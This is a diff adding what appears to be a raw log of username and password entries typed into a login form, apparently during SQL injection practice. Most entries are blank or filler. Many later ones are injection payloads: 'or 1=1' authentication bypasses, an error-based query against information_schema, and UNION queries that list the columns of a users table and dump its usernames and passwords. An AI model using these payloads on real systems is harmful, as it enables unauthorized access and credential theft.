@@ -1,0 +1,112 @@
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:dswdPassword:dasdas
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:csacPassword:csac
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:dasPassword:dsada
+User Name:dasPassword:dsada
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:admin' 1 or 1=1#Password:frfrfcdc
+User Name:admin' 1 or 1=1#Password:frfrfcdc
+User Name:Password:
+User Name:Password:
+User Name:ddccxdxPassword:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:admin' 1 or 1=1#Password:
+User Name:PasswordPassword:Password
+User Name:PasswordPassword:Password
+User Name:passwordPassword:password
+User Name:admin' 1 or 1=1#Password:sxs
+User Name:admin' 1 or 1=1#Password:admin
+User Name:admin' 1 or 1=1#Password:admin
+User Name:Password:
+User Name:Password:
+User Name:admin' 1 or 1=1#Password:ds
+User Name:admin' 1 or 1=1#Password:admin
+User Name:admin' 1 or 1=1#Password:admin
+User Name:admin' 1 or 1=1#Password:sa
+User Name:admin' 1 or 1=1#Password:asd
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin' or 1=1#Password:dsad
+User Name:admin'  or 1=1#Password:asda
+User Name:admin'  or 1=1#Password:asda
+User Name:xz\xPassword:x\zx\z
+User Name:admin'  or 1=1#Password:xxx
+User Name:admin' or 1=1 #Password:asdasdasd
+User Name:sadasdasdasPassword:asdasdsa
+User Name:admin' or 1=1 #Password:qrewrewr
+User Name:Password:
+User Name:select 1 from (select concat(*), ( concat((select database() ), floor(rand(0)*2 ))c from information_schema.columns #Password:sadasdasd
+User Name:adminPassword:admin
+User Name: Select col1,col2,col3 from users where username=  '   abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  #Password:sadasdsadasd
+User Name: Select col1,col2,col3 from users where username=  '   abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  #Password:asdasdsadsad
+User Name:abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  #Password:asdasdsad
+User Name:abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  # Password:sadsadasd
+User Name:abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  # Password:sadasdsadsad
+User Name:abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  # Password:sadasdsad
+User Name:abc' union select group_concat(column_name),2 from information_schema.columns where table_schema='security'and table_name='users'  # Password:asdasdsad
+User Name:asdadasdPassword:asdadasd
+User Name:admin' union select 1,2,3 #Password:admin' union select 1,2,3 #
+User Name:admin' or 1'='1 #Password:admin' or 1'='1 #
+User Name:admin' or 1'='1 #Password:admin' or 1'='1 #
+User Name:adminPassword:admin
+User Name:admin'Password:admin'
+User Name:admin123Password:sadasdasdasd
+User Name:abc'  union select 1,group_concat(id,username,password) from users #Password:abc'  union select 1,group_concat(id,username,password) from users #
+User Name:abc'  union select 1,group_concat(id,username,password) from users #Password:abc'  union select 1,group_concat(id,username,password) from users #
+User Name:abc'  union select 1,group_concat(id,username,password) from users #Password:abc'  union select 1,group_concat(id,username,password) from users #
+User Name:admin' or '1'='1Password:admin' or '1'='1
